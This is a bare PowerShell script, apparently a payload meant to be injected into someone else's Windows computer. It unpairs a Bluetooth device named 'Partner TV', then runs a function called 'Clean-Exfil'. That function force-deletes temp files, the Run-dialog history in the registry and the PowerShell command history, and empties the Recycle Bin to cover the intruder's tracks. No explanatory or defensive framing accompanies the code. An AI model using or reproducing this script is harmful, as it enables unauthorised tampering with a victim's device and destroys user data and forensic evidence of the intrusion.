function Remove-BluetoothDevice {
    param (
        [string]$DeviceName
    )

    Add-Type -AssemblyName System.Runtime.WindowsRuntime

    $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]

    Function Await($WinRtTask, $ResultType) {
        $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
        $netTask = $asTask.Invoke($null, @($WinRtTask))
        $netTask.Wait(-1) | Out-Null
        $netTask.Result
    }

    $bluetoothAPI = [Windows.Devices.Bluetooth.BluetoothLEDevice, Windows.System.Devices, ContentType = WindowsRuntime]
    $deviceInfoAPI = [Windows.Devices.Enumeration.DeviceInformation, Windows.System.Devices, ContentType = WindowsRuntime]

    $pairedSelector = $bluetoothAPI::GetDeviceSelectorFromPairingState($true)
    $pairedTask = $deviceInfoAPI::FindAllAsync($pairedSelector)
    $pairedDevices = Await $pairedTask ([Windows.Devices.Enumeration.DeviceInformationCollection])

    $device = $pairedDevices | Where-Object { $_.Name -eq $DeviceName }
    if ($device) {
        $unpairTask = $device.Pairing.UnpairAsync()
        $unpairResult = Await $unpairTask ([Windows.Devices.Enumeration.DeviceUnpairingResult])
    }
}

Remove-BluetoothDevice -DeviceName "Partner TV"

############################################################################################################################################################

function Clean-Exfil { 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

Clean-Exfil